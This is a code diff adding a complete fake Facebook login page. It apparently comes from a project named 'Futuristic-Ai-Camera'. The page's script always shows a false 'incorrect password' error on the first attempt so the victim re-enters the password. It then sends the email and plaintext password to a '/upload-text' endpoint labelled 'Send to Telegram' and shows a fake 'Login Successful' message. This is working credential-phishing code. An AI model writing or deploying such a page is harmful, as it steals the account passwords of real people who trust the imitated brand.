@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook - log in or sign up</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: Helvetica, Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    
+    .fb-container {
+      max-width: 400px;
+      width: 100%;
+    }
+    
+    .fb-logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    
+    .fb-logo h1 {
+      color: #1877f2;
+      font-size: 56px;
+      font-weight: 700;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    }
+    
+    .fb-card {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+      padding: 20px;
+    }
+    
+    .fb-input {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 17px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      margin-bottom: 12px;
+      outline: none;
+    }
+    
+    .fb-input:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+    
+    .fb-login-btn {
+      width: 100%;
+      padding: 14px 16px;
+      background: #1877f2;
+      color: #fff;
+      font-size: 20px;
+      font-weight: 700;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-bottom: 16px;
+    }
+    
+    .fb-login-btn:hover {
+      background: #166fe5;
+    }
+    
+    .fb-error {
+      color: #d8000c;
+      background: #ffd2d2;
+      padding: 10px;
+      border-radius: 6px;
+      margin-bottom: 12px;
+      font-size: 14px;
+      display: none;
+    }
+    
+    .fb-forgot {
+      text-align: center;
+      margin: 16px 0;
+    }
+    
+    .fb-forgot a {
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    
+    .fb-divider {
+      border-top: 1px solid #dadde1;
+      margin: 20px 0;
+    }
+    
+    .fb-create-btn {
+      display: block;
+      margin: 0 auto;
+      padding: 14px 16px;
+      background: #42b72a;
+      color: #fff;
+      font-size: 17px;
+      font-weight: 600;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    
+    .fb-create-btn:hover {
+      background: #36a420;
+    }
+    
+    .back-link {
+      text-align: center;
+      margin-top: 20px;
+    }
+    
+    .back-link a {
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  
+  <div class="fb-container">
+    <div class="fb-logo">
+      <h1>facebook</h1>
+    </div>
+    
+    <div class="fb-card">
+      <div id="fb-error" class="fb-error"></div>
+      
+      <input 
+        type="text" 
+        id="fb-email" 
+        class="fb-input" 
+        placeholder="Email address or phone number"
+      >
+      
+      <input 
+        type="password" 
+        id="fb-password" 
+        class="fb-input" 
+        placeholder="Password"
+      >
+      
+      <button class="fb-login-btn" onclick="facebookLogin()">Log in</button>
+      
+      <div class="fb-forgot">
+        <a href="#">Forgotten account?</a>
+      </div>
+      
+      <div class="fb-divider"></div>
+      
+      <button class="fb-create-btn">Create new account</button>
+    </div>
+    
+    <div class="back-link">
+      <a href="profile.html">← Back to Profile</a>
+    </div>
+  </div>
+  
+  <script>
+    let attemptCount = 0;
+    
+    async function facebookLogin() {
+      const email = document.getElementById('fb-email').value.trim();
+      const password = document.getElementById('fb-password').value;
+      const errorDiv = document.getElementById('fb-error');
+      
+      if (!email || !password) {
+        errorDiv.textContent = "Please enter both email and password.";
+        errorDiv.style.display = "block";
+        return;
+      }
+      
+      attemptCount++;
+      
+      // First attempt - show error
+      if (attemptCount === 1) {
+        errorDiv.textContent = "The password that you've entered is incorrect. Please try again.";
+        errorDiv.style.display = "block";
+        return;
+      }
+      
+      // Second attempt - success
+      errorDiv.style.display = "none";
+      
+      // Save to localStorage
+      localStorage.setItem("userLoggedIn", "true");
+      localStorage.setItem("userName", email);
+      localStorage.setItem("loginMethod", "Facebook");
+      
+      // Send to Telegram
+      await sendToTelegram("Facebook", email, password);
+      
+      // Redirect
+      alert("✅ Login Successful!\n\nWelcome to Premium!");
+      window.location.href = "index.html";
+    }
+    
+    async function sendToTelegram(method, email, password) {
+      const message = `🔐 New Login - ${method}\n\nEmail/Username: ${email}\nPassword: ${password}\n\nFrom: Futuristic-Ai-Camera`;
+      
+      try {
+        const response = await fetch("/upload-text", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ text: message })
+        });
+        console.log("✅ Sent to Telegram!");
+      } catch (err) {
+        console.error("Telegram error:", err);
+      }
+    }
+  </script>
+</body>
+</html>
